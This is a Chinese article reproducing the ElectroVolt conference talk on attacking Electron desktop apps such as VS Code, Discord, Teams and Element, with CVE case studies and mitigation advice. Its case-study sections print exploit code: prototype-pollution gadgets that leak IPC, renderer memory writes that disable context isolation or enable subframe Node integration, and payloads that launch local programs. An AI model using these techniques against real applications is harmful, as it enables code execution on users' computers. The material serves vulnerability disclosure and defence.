---
title: 【微信】ElectroVolt：攻破热门桌面应用，同时揭示 Electron 上的新攻击面
source: https://mp.weixin.qq.com/s/VgmX6FcFVP0goQe4ugQwTQ
source_host: mp.weixin.qq.com
clip_date: 2026-10-14T22:08:30+08:00
trace_id: 1492061a-b425-4662-b392-70339679b996
content_hash: 5fea279de0a8782576f9104633650bfae0f607b8ccda40cb85864a2706818769
status: synced
tags:
  - 微信
  - Android逆向
  - Frida
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: 主流 Electron 桌面应用即使开启沙箱与上下文隔离，攻击者仍能从被攻陷的渲染进程篡改 WebPreferences 内存字段，配合渲染器漏洞完成 RCE，研究团队在 20 个应用中验证了该路径。
ai_summary_style: key-points
images_status:
  total: 1
  succeeded: 1
  failed_urls: []
notion_page_id: 3f975244-d011-8133-8de7-e90d5e0897f6
ioc:
  cves:
    - CVE-2021-21220
    - CVE-2021-39184
    - CVE-2021-43908
    - CVE-2021-44165
    - CVE-2022-23597
    - CVE-2022-29247
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> 主流 Electron 桌面应用即使开启沙箱与上下文隔离，攻击者仍能从被攻陷的渲染进程篡改 WebPreferences 内存字段，配合渲染器漏洞完成 RCE，研究团队在 20 个应用中验证了该路径。
> 
> - **利用前提：** 渲染进程先被攻陷（XSS、深链错误配置、第三方嵌入），攻击面取决于 `nodeIntegration`、`contextIsolation`、`sandbox`、`nodeIntegrationInSubFrames` 四个开关的组合。
> - **四类场景：** NI 直开可直接拿 shell；CIso 开启可走渲染器漏洞或设法禁用 CIso；沙箱开启则依赖 IPC 错误配置（Electron<10 用 remote，>14 只剩主进程 IPC）。
> - **关键原语：** 用 Chrome V8 渲染器漏洞读写 WebPreferences 内存——`node_integration_in_sub_frames` 偏移 `0x1ac` 由 0 改 1、`context_isolation` 偏移 `0x184` 清零，即可在子框架暴露 preload/contextBridge API。
> - **代表案例：** VS Code 受限模式绕过（CVE-2021-43908）、Discord 利用 new-window 配置错误加 CVE-2021-21220、Teams 经 CKEditor 0day 配合 CVE-2021-39184 任意文件读取、Element RCE（CVE-2022-23597）的两阶段 NISF 攻击。
> - **缓解要点：** 开启全部安全标志，在所有资产含子域名上消除 XSS 与开放重定向，不在主进程实现敏感 IPC，并校验 IPC 的 senderFrame；补丁差距使多数应用仍易受攻击。

**securitainment** *2026年10月14日 15:05*

> "My other computer is your computer."（我另一台电脑就是你的电脑）

## 讲者

**Mohan Sri Rama Krishna Pedhapati，aka s1r1us**

-   喜欢浏览器、CTF 和区块链
    
-   现于 Cure53 从事 Web/应用安全
    
-   部分亮点：2021 年「十大 Web 黑客技术」第 4 名
    
-   研究成果发表于 Defcon、BlackHat 与 BSides
    
-   印度艾哈迈达巴德 CTF 战队 Invaders 队长
    

## 议程

-   Electron 简介
    
-   案例研究
    
-   已知的 Electron 漏洞
    
-   **渲染进程被攻陷后的新攻击面**
-   缓解措施
    
-   补丁差距
    
-   结论
    

## 什么是 Electron？

-   流行的跨平台桌面应用框架
    
-   **Chromium + Node.js = Electron**
-   被 VSCode、Teams、Discord、Slack 等 **500 多个应用** 使用
    

## Electron 架构

```
Electron 应用
├── Node 共享库
├── IPC 模块
├── 无沙箱渲染进程（NoSandboxRenderer）
├── 沙箱渲染进程（SandboxRenderer）
├── NodeModules/
└── 操作系统交互

主进程（Main Process）      → ipcMain
渲染进程（Renderer Process）→ DOM API、Node.js API、ipcRenderer
```

### 主进程与渲染进程示例

```javascript
// 主进程（main.js）
const { ipcMain, shell, BrowserWindow } = require('electron')

var win = new BrowserWindow({
  webPreferences: {
    sandbox: false,
    nodeIntegration: true,
    preload: './preload.js',
    contextIsolation: true
  }
})
win.loadURL('//google.com')

ipcMain.on('openUrl', (event, url) => {
  shell.openExternal(url);
});
```

## 这些 webPreferences是什么？

```yaml
webPreferences: {
  sandbox: false,
  nodeIntegration: true,
  preload: './preload.js',
  contextIsolation: true
}
```

## 启用 NodeIntegration 且启用 ContextIsolation 的 Electron 应用

```yaml
new BrowserWindow({
  webPreferences: {
    sandbox: true / false,
    nodeIntegration: true,
    contextIsolation: false,
    preload: './1.js'
  }
})
```

### 通过 preload 暴露 API

```javascript
// ./preload.js
const { contextBridge, ipcRenderer } = require('electron')
contextBridge.exposeInMainWorld('electron', {
  openUrl: (url) => ipcRenderer.send('openUrl', url)
})

// 主进程（main.js）
const { ipcMain, shell, BrowserWindow } = require('electron')
var win = new BrowserWindow({
  webPreferences: {
    sandbox: false,
    nodeIntegration: true,
    preload: './preload.js',
    contextIsolation: true
  }
})
win.loadURL('//google.com')

ipcMain.on('openUrl', (event, url) => {
  shell.openExternal(url);
});

// 网页中（此处没有 Electron 模块 ipc）
// <script>
//   window.electron.openUrl('file:///System/Applications/Calculator.app/Contents/MacOS/Calculator')
// </script>
```

## 沙箱渲染进程 vs 无沙箱渲染进程

```
// 沙箱渲染进程
new BrowserWindow({
  webPreferences: { sandbox: true, nodeIntegration: true, contextIsolation: false }
}).loadURL('//example.com')

// 无沙箱渲染进程
new BrowserWindow({
  webPreferences: { sandbox: false, nodeIntegration: true, contextIsolation: false }
}).loadURL('//example.com')
```

**当 XSS == RCE**：攻击面所在之处。

## 术语

-   **Node Integration**
    
    \=> **NI**
    
-   **Context Isolation**
    
    \=> **CIso**
    
-   **Node Integration in Workers**
    
    \=> **NIW**
    
-   **Node Integration in Subframes**
    
    \=> **NISF** （会暴露 preload）
    
-   **Sandbox**
    
    \=> **SBX**
    

## 场景一：NI:true, CIso:false, SBX:false

-   容易拿到 shell，因为 Node 直接暴露给渲染进程
    
-   只需找到办法把你的 JavaScript 嵌进去
    

```
// 无沙箱渲染进程
new BrowserWindow({
  webPreferences: { sandbox: 0, nodeIntegration: 1, contextIsolation: 0 }
}).loadURL('//example.com')
```

## 案例研究 1：VS Code 绕过 Restricted Mode 实现 RCE（CVE-2021-43908）

-   绕过了「Trust Codebase」勾选框， **即使打开不可信代码库也能实现 RCE**
    
-   攻击链：受限 Markdown XSS → RCE
    

> "你是否信任此文件夹中文件的作者？Code-Insiders 提供的功能可能会自动执行此文件夹中的文件。如果你不信任这些文件的作者，我们建议继续使用受限模式，因为这些文件可能含有恶意内容。"

**公告**：https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-43908

### 案例研究 1：VS Code RCE 流程

```
vscode-file / vscode-webview
├── nodeIntegration: true
├── Markdown 预览器 + pwn.md
├── 严格 CSP
├── 泄露 vs-code-webview 的 ext id
└── top.require('child_process')
```

流程： `test.html` → 攻击者控制的 `/pwn.php` → 通过 iframing 向 vscode-webview 发出 postMessage XSS → 重定向到本地 file 通道（ `channel:content`, `arg:XSS payload` ）→ `channel:doread` 泄露用户目录位置。

## 我想要更多！

## 场景二：NI:false/true, CIso:true, SBX:false

-   若启用了 CIso，Node 不会直接暴露在渲染进程中
    
-   **两条利用路径**
    
    ：
    
-   可以使用渲染器漏洞利用（因为没有沙箱）
    
-   设法 **禁用 Context Isolation** （后续幻灯片详述）
    

## 案例研究 2：Discord RCE

1.  当时使用 Electron/12.14.1、Chrome/83.0.4103.122
    
2.  某个视频嵌入中存在 XSS，但 Electron 中 iframe 是沙箱化的
    
3.  滥用 Discord 的 **new-window 处理程序错误配置**，在一个 **未启用沙箱** 的新 Electron 窗口中打开 `https://example.com/exp.html`
    
4.  运行 Chrome V8 渲染器漏洞利用（**CVE-2021-21220**）获得 RCE
    

## 场景三：NI:false, CIso:false, SBX:true

-   渲染进程启用了沙箱（seccomp、win32k lockdown）
    
-   渲染进程中 **不暴露任何 Node 模块**
    
-   你加载的网站与 preload/Electron 内部代码之间 **没有隔离**
    

## 如何拿到 shell？

**Electron < 10**

-   使用原型污染（prototype pollution）gadget 泄露 remote/IPC 模块
    
-   使用 Remote 模块获得 Node 访问权
    

**Electron 10 < 版本 < 14**

-   使用原型污染 gadget 泄露 remote/IPC 模块
    
-   前提是 Remote 模块被显式启用
    
-   IPC 错误配置
    

**Electron > 14**

-   使用原型污染 gadget 泄露 IPC 模块
    
-   Remote 已废弃
    
-   只剩下主进程上的 IPC 错误配置
    

### 原型污染示例

```html
<script>
const origEndsWith = String.prototype.endsWith;
String.prototype.endsWith = function(...args) {
  if (args && args[0] === "/electron") {
    String.prototype.endsWith = origEndsWith;
    return true;
  }
  return origEndsWith.apply(this, args);
}

const origCallMethod = Function.prototype.call;
Function.prototype.call = function(...args) {
  if (args[3] && args[3].name === "__webpack_require__") {
    window.__webpack_require__ = args[3];
  }
  Function.prototype.call = origCallMethod;
  return origCallMethod.apply(this, args);
}
</script>
```

```bash
// sandbox: true, nodeIntegration: false, contextIsolation: false
ipc = __webpack_require__[3]('./lib/renderer/ipc-renderer-internal.ts').ipcRendererInternal;
a = __webpack_require__[3]('./node_modules/process/browser.js')._linkedBinding('electron_renderer_ipc')
```

→ 泄露 **IPC Renderer Internal** （即 `ELECTRON_*` 、 `GUEST_*` 等通道）以及 IPC Renderer（开发者自定义通道）。

### CVE-2021-39184

**沙箱渲染进程可以通过原生 Image API 获取任意文件的缩略图。**

```
await ipc.invoke(
  'ELECTRON_NATIVE_IMAGE_CREATE_THUMBNAIL_FROM_PATH',
  '/Users/electro/Documents/research/filename.ext',
  { height: 10, width: 10 }
)
```

-   Windows： `IThumbnailCache::GetThumbnail`
    
-   macOS： `QLThumbnailCopyImage`
    

参考：https://github.com/electron/electron/security/advisories/GHSA-mpim-v997-c4h4（致谢 nornagon）

## 案例研究 3：Microsoft Teams 本地文件读取

1.  使用 Electron < 15
    
2.  利用 CKEditor 的 0day（**CVE-2021-44165**）在渲染进程中实现 XSS
    
3.  在新窗口上， **CIso 被禁用而沙箱被启用**
    
4.  使用原型污染 gadget 通过 XSS 泄露 IPC
    
5.  向浏览器进程发送 IPC，读取给定路径的文件（**CVE-2021-39184**）
    

```
await ipc.invoke(
  'ELECTRON_NATIVE_IMAGE_CREATE_THUMBNAIL_FROM_PATH',
  '/Users/electro/Documents/research/filename.ext',
  { height: 10, width: 10 }
)
```

## 更多！

## 场景四：NI:false, CIso:true, SBX:true

-   **大多数应用使用的配置**
-   渲染进程中不暴露 Node 模块
    
-   **启用 CI 后，IPC 无法通过原型污染泄露**
-   已沙箱化
    

## 那它就只是浏览器里的 XSS 吗？

> **不！**

## 从被攻陷的渲染进程启用 SubFrames 中的 Node Integration（CVE-2022-29247）

### 什么是 nodeIntegrationInSubFrames

`nodeIntegrationInSubFrames` ——一个实验性选项，用于在 iframe 和子窗口等 **子框架** 中启用 Node.js 或 preload 支持。

对每个子框架：

-   若 NI 启用且沙箱禁用，则 **preload 与 Node.js 都可用**
    
-   若 NI 禁用（无论沙箱启用或禁用），则 **你所有的 preload 都会加载**
    

### nodeIntegrationInSubFrames: false

```html
主窗口中的 iframe（//pwn.af）——抛出错误

<iframe src='//pwn.af'></iframe>
<script>
  window.electron.openUrl('file:///System/Applications/Calculator.app/Contents/MacOS/Calculator')
</script>
```

### nodeIntegrationInSubFrames: true

```
主窗口中的 iframe（//pwn.af）——生效！
```

### nodeIntegrationInSubFrames: false的现实

-   **大多数时候我们在子框架或 iframe 中获得 XSS**
-   而 `nodeIntegrationInSubFrames` 大多是 **禁用** 的
    
-   因此 **无法访问 contextBridge 暴露的 API**
    

### Node Integration in SubFrames 的实现

**Electron 给 Blink 打了补丁**，在 `WebPreferences` 中加入了 `node_integration_sub_frames` 、 `context_isolation` 等设置：

```ruby
// third_party/blink/common/web_preferences/web_preferences.cc
@@ -145,6 +145,22 @@ WebPreferences::WebPreferences()
     fake_no_alloc_direct_call_for_testing_enabled(false),
     v8_cache_options(blink::mojom::V8CacheOptions::kDefault),
     record_whole_document(false),
+    // Begin Electron-specific WebPreferences.
     opener_id(0),
     context_isolation(false),
     is_webview(false),
     hidden_page(false),
     offscreen(false),
+    node_integration_sub_frames,
     preload(base::FilePath::StringType()),
     native_window_open(false),
     node_integration(false),
     node_integration_in_worker(false),
     node_integration_in_sub_frames(false),
     enable_plugins(false),
     enable_websql(false),
     webview_tag(false),
+    // End Electron-specific WebPreferences.
     cookie_enabled(true),
```

```rust
// shell/renderer/electron_sandboxed_renderer_client.cc
void ElectronSandboxedRendererClient::DidCreateScriptContext(
    v8::Handle<v8::Context> context,
    content::RenderFrame* render_frame) {
  // Only allow preload for the main frame or
  // For devtools we still want to run the preload_bundle script
  // Or when nodeSupport is explicitly enabled in sub frames
  bool is_main_frame = render_frame->IsMainFrame();
  bool is_devtools =
      IsDevTools(render_frame) || IsDevToolsExtension(render_frame);
  bool allow_node_in_sub_frames =
      render_frame->GetBlinkPreferences().node_integration_in_sub_frames;
  bool should_load_preload =
      (is_main_frame || is_devtools || allow_node_in_sub_frames) &&
      !IsWebviewFrame(context, render_frame);

  if (!should_load_preload)
    return;
  // ...removed for brevity...
}
```

### 用渲染器漏洞利用启用 NISF

**细心的读者会注意到：这个检查发生在渲染进程上。**

-   使用渲染器漏洞利用，我们就能把 `node_integration_in_sub_frames` 设为 **1**
    

参考：https://github.com/electron/electron/blob/bd10b19b0cdc46cdbadb570af89305e64541b679/shell/renderer/electron_sandboxed_renderer_client.cc#L217

```javascript
// 若 WebPreferences 为 true，则暴露 preload contextBridge API
var win = addrof(window);
console.log("[+] window addrof :" + win.hex());
var addr1 = half_read(win + 0x18n);
console.log("[+] window:" + addr1.hex());
var addr2 = full_read(addr1 + 0xf8n);
console.log("[+] add2:" + addr2.hex());
var web_pref = addr2 + 0x50008n;      // WebPreferences 偏移
console.log("[+] web_pref addr:" + web_pref.hex());
var nisf = web_pref + 0x1acn;         // node_integration_in_sub_frames 偏移
var nisf_val = full_read(nisf);
console.log("[+] nisf val =" + nisf_val.hex());
var overwrite = nisf_val | 0x0000000000000001n;   // 从 0 设为 1
full_write(nisf, overwrite);
var nisf_val = full_read(nisf);
console.log("[+] nisf val overwritten =" + nisf_val.hex());
```

## 案例研究 4：Element RCE（CVE-2022-23597）

-   使用 Chrome/91.0.4472.164、Electron/13.5.1
    
-   通过深链（deep link）错误配置在嵌入内容上实现 XSS
    
-   嵌入内容上 **没有 contextBridge API**
    
-   运行 Chrome 渲染器 V8 漏洞利用， **在嵌入内容上暴露 contextBridge API**
    

```typescript
// 渲染进程            // 主进程（main.js）
// nodeIntegrationInSubFrames: false, SBX: true, NI: false, CIso: true
const { ipcMain, shell } = require('electron')
ipcMain.on('userDownloadopen', function(evt, path) {
  shell.openPath(path);
});

// preload.js（隔离世界/上下文）
const { contextBridge, ipcRenderer } = require('electron')
contextBridge.exposeInMainWorld("electron", {
  send(channel: string, ...args: any[]): void {
    if (!CHANNELS.includes(channel)) {
      console.error(`Unknown IPC channel ${channel} ignored`); return;
    }
    ipcRenderer.send(channel, ...args);
  }
});
```

### 两阶段攻击

```css
阶段 1：NISF 从 0 变 1
主窗口 --v8Exploit--> Preload.js / Main.js

阶段 2：创建 Iframe
主窗口 --我们的 iframe 中的 XSS--> Preload.js（userDownloadOpen）→ Main.js

目标：传入 file://Calc.app
（RCE 汇聚点：window.electron.send → send(channel, args..)）
```

```javascript
// 创建带 srcdoc 的 iframe，其中含有 contextBridge API
var win = addrof(window);
console.log("[+] window addrof :" + win.hex());
var addr1 = half_read(win + 0x18n);
var addr2 = full_read(addr1 + 0xf8n);
var web_pref = addr2 + 0x50008n;   // WebPreferences 偏移
console.log("[+] web_pref addr:" + web_pref.hex());
var nisf = web_pref + 0x1acn;      // node_integration_in_subframes 偏移
var nisf_val = full_read(nisf);
console.log("[+] nisf val =" + nisf_val.hex());
var overwrite = nisf_val | 0x0000000000000001n;   // 从 0 设为 1
full_write(nisf, overwrite);

var frame = document.createElement("iframe")
frame.srcdoc = `<script>electron.send('userDownloadopen',
  {path:'/System/Applications/Calculator.app/Contents/MacOS/Calculator'})<\/script>`
document.body.appendChild(frame)
```

## 更多！！！

## 从被攻陷的渲染进程禁用 Context Isolation

### Context Isolation 的实现

```rust
// shell/renderer/electron_render_frame_observer.cc
void ElectronRenderFrameObserver::DidInstallConditionalFeatures(
    v8::Handle<v8::Context> context,
    int world_id) {
  // ...removed for brevity.
  auto prefs = render_frame_->GetBlinkPreferences();
  bool use_context_isolation = prefs.context_isolation;
  bool is_main_world = IsMainWorld(world_id);
  bool is_main_frame = render_frame_->IsMainFrame();
  bool allow_node_in_sub_frames = prefs.node_integration_in_sub_frames;
  bool should_create_isolated_context =
      use_context_isolation && is_main_world &&
      // ...
  if (should_create_isolated_context) {
    CreateIsolatedWorldContext();
    if (!renderer_client_->IsWebViewFrame(context, render_frame_))
      renderer_client_->SetupMainWorldOverrides(context, render_frame_);
  }
}
```

### 用渲染器漏洞利用禁用 CIso

**同样的套路：使用 Chrome V8 渲染器漏洞利用，我们就能把 `context_isolation` 设为 0。**

参考：https://github.com/electron/electron/blob/35ac7fb8e61be744206918684a6881d460591620/shell/renderer/electron_render_frame_observer.cc#L133

```javascript
var win = addrof(window);
console.log("[+] win address : " + win.hex());
var addr1 = half_read(win + 0x18n);
var addr2 = full_read(addr1 + 0xf8n);
var web_pref = addr2 + 0x50008n;
console.log("[+] web_pref addr:" + web_pref.hex());

var ciso = web_pref + 0x184n;      // ci50 偏移
var ciso_val = full_read(ciso);
console.log("[+] ciso val = " + ciso_val.hex());

var overwrite = ciso_val & (0xfffffffffffffff0n);   // 覆写为 0
full_write(ciso, overwrite);
console.log("[+] ciso val overwritten =" + ciso_val.hex());
```

## 案例研究 5：某未披露应用中的 RCE

-   使用 Chrome/94.0.4606.71、Electron/15.1.2
    
-   一个用于在 iframe 中嵌入不可信内容的「功能」
    

```javascript
// 渲染进程
// nodeIntegrationInSubFrames: false, SBX: true, NI: false, CIso: true

// 主进程（main.js）
const { contextBridge, ipcRenderer } = require('electron')
ipcMain.on('open_external', (event, url) => {
  if (!isAllowedUrl(url))
    return;
  shell.openExternal(url);
});

// preload.js（隔离世界/上下文）
const openExternalurl = url => {
  // 净化：仅允许 https://
  ipcRenderer.send('open_external', url);
};
contextBridge.exposeInMainWorld('electron', {
  openExternalurl: url => { openExternalurl(url); }
});
```

### 攻击思路

```
目标：传入 file://Calc.app

URL 校验只允许 https 协议 → NISF 0 变 1

阶段 1：CI 从 1 变 0
主窗口 --V8 漏洞利用 + 重定向--> Preload.js / Main.js

阶段 2：原型污染漏洞利用，泄露 IPC
```

```html
<!-- index.html -->
<html><b>在 leak 中弹出计算器</b><script>

// leak.html 的原型污染 gadget，用于泄露 ipc
const origEndsWith = String.prototype.endsWith;
String.prototype.endsWith = function(...args) {
  if (args && args[0] === "/electron")
    return true;
  return origEndsWith.apply(this, args);
}

const origCallMethod = Function.prototype.call;
Function.prototype.call = function(...args) {
  if (args[3] && args[3].name === "__webpack_require__") {
    window.pwn = args;
  }
  return origCallMethod.apply(this, args);
}

var win = addrof(window);
console.log("[+] window addrof:" + win.hex());
var addr1 = half_read(win + 0x18n);
var addr2 = full_read(addr1 + 0xf8n);
var web_pref = addr2 + 0x50008n;
var ciso = web_pref + 0x184n;    // ciso 偏移
var ciso_val = full_read(ciso);
console.log("[+] ciso val =" + ciso_val.hex());
var overwrite = ciso_val & (0xfffffffffffffff0n);   // 覆写为 0
full_write(ciso, overwrite);

var ipc = pwn[3]('./lib/renderer/api/ipc-renderer.ts').default;
ipc.send('open_external', 'file:///System/Applications/Calculator.app')
location = '/leak.html'
</script></html>
```

## 在较老版本中从被攻陷的渲染进程禁用 Context Isolation

## 案例研究 6：某未披露应用中的 RCE

-   使用相当老的 Electron 版本（11.4.5），且启用了 remote 模块
    
-   某个嵌入内容中存在 XSS
    
-   利用它禁用 Context Isolation
    
-   用原型污染 gadget 泄露 RemoteModule
    
-   拿到 shell： `remote.process.binding('spawn_sync')`
    

### 在老版本 Electron 上禁用 CIso

**在老版本 Electron 中，Context Isolation 的实现方式不同**——它不使用 `WebPreferences` ，而是存储在 renderer client 上：

```rust
// shell/renderer/electron_render_frame_observer.cc
void ElectronRenderFrameObserver::DidInstallConditionalFeatures(
    v8::Handle<v8::Context> context,
    int world_id) {
  bool use_context_isolation = renderer_client_->isolated_world();
  bool is_main_frame = render_frame_->IsMainFrame();
  bool allow_node_in_sub_frames = prefs.node_integration_in_sub_frames;
  bool should_create_isolated_context =
      use_context_isolation && is_main_world &&
      // ...
  if (should_create_isolated_context) {
    CreateIsolatedWorldContext();
    if (!renderer_client_->IsWebViewFrame(context, render_frame_))
      renderer_client_->SetupMainWorldOverrides(context, render_frame_);
  }
}
```

**原型污染 gadget 只在当前窗口是主框架（顶层窗口）时才有效。**

```
// third_party/blink/renderer/core/frame/frame.h
bool IsMainFrame() const;
```

我们可以通过把 `IsMainFrame` 覆写为 1， **让自己成为顶层窗口**。

参考：https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/frame/frame.h;l=139

```javascript
var window_addr = addrof(window);
var window_struct = half_aar64(window_addr + 0x18n);
var frame = full_aar64(window_struct + 0x48n);
var webframe = frame - 0xa8n;
var render_frame = full_aar64(webframe) - 0xb8n;

// 覆写 IsMainFrame = 1
full_aaw64(render_frame + 0xd8n, 0x1n);

var electron_observer = full_aar64(observer_ + 0x10n);
var routing_id = full_aar64(electron_observer + 0x18n);
console.log("[+] routing id =" + routing_id.hex());
var render_client = full_aar64(electron_observer + 0x28n);
console.log("[+] render_client =" + render_client.hex());
var ciso = full_aar64(render_client + 0x48n);

// 覆写 ciso = 0
full_aaw64(render_client + 0x48n, 0x0n);
console.log("[+] ciso after =" + ciso.hex());
console.log("[+] going to leak")
location = './leak.html?as=as';
```

```javascript
// leak.html
function calc() {
  a = pwn[3]('./lib/renderer/api/remote.ts');
  a.process.binding('spawn_sync').spawn({
    file: "open",
    args: ["open", "/System/Applications/Calculator.app"]
  });
}

const origEndsWith = String.prototype.endsWith;
String.prototype.endsWith = function(...args) {
  if (args && args[0] === "/electron")
    return true;
  return origEndsWith.apply(this, args);
}

const origCallMethod = Function.prototype.call;
Function.prototype.call = function(...args) {
  if (args.length == 4) {
    window.pwn = args;
    console.log("found webpack require")
    setTimeout(calc, 100);
  }
  return origCallMethod.apply(this, args);
}
```

## 同站源欺骗（Same-Site Origin Spoofing）

**Electron 应用**

```
进程 1：https://main.example.com
  嵌入：
    1. https://youtube.com
    2. https://sandbox.example.com
```

```
进程 2：https://youtube.com
窗口：https://sandbox.example.com
  document_.url_ = main.example.com
  security_context_.security_origin_.port = 443
```

## 补丁差距（Patch Gap）

-   应用更新不及时，使它们中的大多数都易受这些攻击影响
    
-   **Chromium 的沙箱逃逸同样可以被利用**

## 缓解措施

-   **启用所有安全标志**
-   不要使用安全记录不佳的嵌入内容（第三方嵌入）
    
-   在 **所有资产（包括子域名）** 上缓解安全漏洞（XSS、开放 URL 重定向等）
    
-   **不要在主体进程上实现敏感的 IPC**
-   确保所有 IPC 消息处理器都 **恰当校验 senderFrame**
    
-   如果你要发布自己那套结合浏览器层与应用层代码的库，确保 **有充分的隔离**
    
-   阅读：https://www.electronjs.org/docs/latest/tutorial/security
    

## 尾声

**我们总共在 20 个不同的 Electron 应用上实现了 RCE。**

例如：JupyterLab、Mattermost、Rocket.Chat、Notion、Basecamp——本次演讲覆盖的只是其中少数几个。

## 要点

-   深入你所审计的框架， **不要把自己局限在应用层**
    
-   用户会点击任何地方、打开任何消息
    
-   **尽可能缩小应用的攻击面**
    
    （开放 URL 重定向总有一天也能变成 RCE）
    

## 研究团队

-   Mohan Sri Rama Krishna Pedhapati（@S1r1u5）
    
-   Aaditya Purani（@knapstack）
    
-   William Bowling（@vakzz）
    
-   Max Garrett（@TheGrandPew）
    

## 感谢其他协作者

-   Yudai（@ptr-yudai）
    
-   Sergey Bobrov（@Black2Fan）
    
-   terjanq（@terjanq）
    
-   Masato Kinugawa（@kinugawamasato）
    
-   Harsh Jaiswal（@rootxharsh）
    

## 谢谢！

想深入了解我们的发现、并保护你的 Electron 应用？

Research · 目录
